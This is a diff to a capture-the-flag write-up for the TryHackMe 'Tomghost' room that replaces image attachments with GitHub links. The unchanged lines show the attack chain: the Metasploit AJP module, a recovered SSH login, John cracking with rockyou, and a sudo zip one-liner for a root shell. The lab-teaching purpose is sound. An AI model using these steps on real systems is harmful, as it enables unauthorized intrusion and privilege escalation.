@@ -43,13 +43,13 @@ Shellcodes: No Results
 
 - we found ajp metasploit
 
-![image.png](attachment:7ea4f834-46d5-4534-bae2-a183c8e32e07:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(1).png
 
 - use msfconsole and search ajp
 - use 0
 - set up rhosts and exploit
 
-![image.png](attachment:bc21e799-9718-4c0f-9d42-809303d383d5:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(2).png
 
 ```jsx
 skyfuck:8730281lkjlkjdqlksalks
@@ -59,7 +59,7 @@ skyfuck:8730281lkjlkjdqlksalks
 
 - use the above credential and login via ssh
 
-![image.png](attachment:6674aa4d-c39e-4e76-83eb-d1f6c0255ff3:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(3).png
 
 ```jsx
 find / -type f -name user.txt 2> /dev/null
@@ -108,7 +108,7 @@ Then, start cracking it with John.
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-![image.png](attachment:9c07f907-e169-4c7e-a34d-fde0e5006d10:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(4).png
 
 ```jsx
 alexandru 
@@ -155,9 +155,9 @@ find / -perm -u=s -type f 2>/dev/null
 
 Look for files with the SUID bit, which allows us to run files with elevated privileges beyond the current user.
 
-![image.png](attachment:8f5a563d-5c6a-4782-982e-b36e346b7c33:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(5).png
 
-![image.png](attachment:49f9dbd4-d7af-42cf-a0bf-e09d6b2b5592:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(6).png
 
 - we can find that in GTFOBins
 - we will use that commands
@@ -167,7 +167,7 @@ TF=$(mktemp -u)
 sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
 ```
 
-![image.png](attachment:123bd93f-5d08-43e7-9ea4-fe39302c31e8:image.png)
+https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(7).png
 
 Finally, we got the root.
 
